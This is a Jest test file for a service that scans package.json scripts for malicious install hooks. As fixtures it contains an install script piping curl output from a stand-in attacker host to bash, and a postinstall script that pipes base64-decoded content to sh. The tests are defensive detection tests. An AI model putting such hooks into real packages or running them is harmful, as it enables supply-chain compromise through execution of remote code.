import { AnalyzerService } from '../src/services/AnalyzerService';
import path from 'path';
import fs from 'fs';

// Mock specific FS calls if needed, but integration style on a fixture is better.
// For now, let's mock fs.readFileSync to avoid creating files.

jest.mock('fs');

describe('AnalyzerService', () => {
    let analyzer: AnalyzerService;

    beforeEach(() => {
        analyzer = new AnalyzerService();
        jest.clearAllMocks();
    });

    it('should detect suspicious curl | bash pattern', async () => {
        const mockPackageJson = JSON.stringify({
            name: 'test-pkg',
            scripts: {
                install: 'curl http://evil.com | bash'
            }
        });

        (fs.existsSync as jest.Mock).mockReturnValue(true);
        (fs.statSync as jest.Mock).mockReturnValue({ isDirectory: () => false });
        (fs.readFileSync as jest.Mock).mockReturnValue(mockPackageJson);
        // Mock path.dirname and join if strictly needed by implementation details, 
        // but Analyzer uses targetPath directly if checking file status logic allows.
        // Actually Analyzer logic: 
        // if (fs.statSync(targetPath).isDirectory()) ...
        // else dirPath = path.dirname(targetPath);

        const result = await analyzer.analyze('package.json');

        expect(result.packageName).toBe('test-pkg');
        expect(result.vulnerabilities.length).toBeGreaterThan(0);
        const descriptions = result.vulnerabilities.map(v => v.description);
        expect(descriptions).toContain(expect.stringMatching(/Pipes content directly to bash/));
    });

    it('should detect suspicious base64 usage', async () => {
        const mockPackageJson = JSON.stringify({
            name: 'test-pkg',
            scripts: {
                postinstall: 'echo "bWFsaWNpb3Vz" | base64 -d | sh'
            }
        });

        (fs.existsSync as jest.Mock).mockReturnValue(true);
        (fs.statSync as jest.Mock).mockReturnValue({ isDirectory: () => false });
        (fs.readFileSync as jest.Mock).mockReturnValue(mockPackageJson);

        const result = await analyzer.analyze('package.json');

        // Should catch base64 AND | sh
        const patterns = result.vulnerabilities.map(v => v.description);
        expect(patterns.some(p => p.includes('Base64'))).toBeTruthy();
        expect(patterns.some(p => p.includes('Pipes content directly to sh'))).toBeTruthy();
    });

    it('should be safe with safe scripts', async () => {
        const mockPackageJson = JSON.stringify({
            name: 'safe-pkg',
            scripts: {
                test: 'echo "hello world"'
            }
        });

        (fs.existsSync as jest.Mock).mockReturnValue(true);
        (fs.statSync as jest.Mock).mockReturnValue({ isDirectory: () => false });
        (fs.readFileSync as jest.Mock).mockReturnValue(mockPackageJson);

        const result = await analyzer.analyze('package.json');
        expect(result.vulnerabilities.length).toBe(0);
    });
});
